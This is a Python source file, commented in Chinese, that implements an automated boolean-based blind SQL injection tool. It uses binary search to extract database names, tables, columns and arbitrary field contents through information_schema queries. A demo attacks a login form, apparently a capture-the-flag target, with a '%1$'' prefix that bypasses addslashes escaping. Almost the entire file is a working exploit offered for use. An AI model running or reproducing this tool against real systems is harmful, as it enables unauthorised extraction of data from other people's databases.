import requests
from tools import binary_search
import copy

# 基于二分查找的自动化布尔盲注入

class bool_based(object):
   
    # url : 注入目标
    # attacker : 发起请求的函数，详细参考demo
    def __init__(self,url,attacker):
        self._url = url
        self._attacker = attacker
        self._info = None
        self._where_value = None
        self._db = "information_schema"

    def __get(self,fields,table,where=None):
        param = {"fields":fields,"table":table,"where":where}
        return param

    # 查看所有数据库
    def dump_db(self):
        self._info = self.__get("schema_name",f"{self._db}.schemata",None)
        return self

    # 查看表
    def dump_table(self,db_name):
        self._info = self.__get("table_name",f"{self._db}.tables","table_schema")
        self._where_value = db_name
        return self
    
    # 查看字段
    def dump_column(self,table_name):
        self._info = self.__get("column_name",f"{self._db}.columns","table_name")
        self._where_value = table_name
        return self

    # 打印生产的payload
    def demo_sql(self):
        payload = " or (select ({content} {symble}{value}))#".format(content=self.__query_length()
                                                                ,symble=">",value=0)
        print(payload)
        
        payload = " or (select ({content} {symble}{value}))#".format(content=self.__query_content().format(index=1)
                                                                ,symble=">",value=0)
        print(payload)

    #　根据是否输入where条件生产参数字典
    def __get_param(self):
        info = self._info
        value = self._where_value
        where = f" where {info['where']}={value}" if info["where"] else  ""
        result = copy.deepcopy(info)
        result["where"] = where
        return result

    # 生产查询长度的sql语句
    def __query_content(self):
        sqli_str = " (select ascii(substring(group_concat({fields}),{index},1)) from {table} {where} )"
        return sqli_str.format(**self.__get_param(),index="{index}")

    # 生产查询内容的sql语句
    def __query_length(self):
        sqli_str = " (select length(group_concat({fields})) from  {table} {where}  )"
        return sqli_str.format(**self.__get_param())

    # 查看自定义表和字段
    # fields : 字段，多个用,分开
    # table : 表名
    # where , where_value : "where {where} = {where_value}" 
    def dump(self,fields,table,where,where_value=None):
        self._info=self.__get(fields,table,where)
        self._where_value = where_value
        return self
        
    # 判断条件是否成立
    # sql : 执行的sql语句
    # symble : >,<,=
    # comparison_value : 需要比较的值
    def __comparator(self,sql,symble,comparison_value):
       
        payload = " or (select ({content} {symble}{value}))#".format(content=sql
                                                                ,symble=symble,value=comparison_value)
        
        return self._attacker(self._url,payload)

    # 开始注入
    # display : 是否在注入的过程中显示已经获取到的结果
    def inject(self,display=True):
        sql = self.__query_length()
        length = binary_search(1,400,lambda i,j:self.__comparator(sql,i,j))
        print(f"result length : {length}")
        index = 0
        result = ""
        while length is not 0:
            index += 1
            if index>length:
                break
            sql = self.__query_content().format(index = index)
            ascii_num = binary_search(32,126,lambda i,j:self.__comparator(sql,i,j))
            if ascii_num!=-1:
                result += chr(ascii_num)
            if display:
                print(result,flush=True,end='\r')
        return result
        
if __name__ == "__main__":
    # 测试样例
    # 该样例通过username注入，注入需要使用　%1$'　来代替'绕过addalash()
    # post_data(url,payload):bool为需要自己编写发起请求的函数，其中参数
    # url : 发起请求的url
    # payload : 生产的payload。即注入的or及后面的部分
    # 该函数需要返回布尔值，该例子中结果含有password error即表示注入成功
    def post_func(url,payload):
        data={"username":"%1$'"+payload,"password":"123"}
        r = requests.post(url,data=data)

        if("password error" in r.text):
            return True
        else:
            return False
    url = "www.test.com"
    injector = bool_based(url,post_func)
    injector.dump("flag","flag","").demo_sql()
    injector.inject()
